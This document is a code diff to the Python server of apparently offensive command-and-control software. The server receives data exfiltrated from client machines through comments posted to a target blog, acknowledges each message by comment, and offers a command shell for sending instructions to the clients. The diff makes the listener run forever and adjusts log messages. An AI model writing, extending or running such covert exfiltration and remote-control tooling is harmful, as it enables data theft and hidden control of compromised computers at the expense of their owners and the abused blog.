@@ -43,8 +43,7 @@ def thread_start_listener():
     if btm_recv_config.prev_unapproved_index == 0:
         btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
 
-    loop_counter = 99
-    while(loop_counter > 0):
+    while(True):
         received_data = receive_data(channel, len(clients), btm_recv_config)
 
         for exfil_content in received_data:
@@ -56,12 +55,11 @@ def thread_start_listener():
             f.close()
 
             message_id = exfil_content.split(":")[0]
-            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Extracted message_id is " + message_id + ". Sending acknowledgement...", 1)
+            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received message with ID " + message_id + ". Sending acknowledgement...", 1)
             response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
             log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
 
         btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
-        loop_counter -= 1
 
 threading.Thread(target=thread_start_listener).start()
 time.sleep(1)
@@ -71,7 +69,7 @@ class ServerShell(cmd.Cmd):
     prompt = ">> "
 
     def do_info(self, args):
-        log_print("[INFO] Sending info command...", 1)
+        log_print("[INFO] Sending info command to clients...", 1)
         message = Message()
         message.message_id = generate_random_string(10)
         message.message = message.message_id + ": Info"
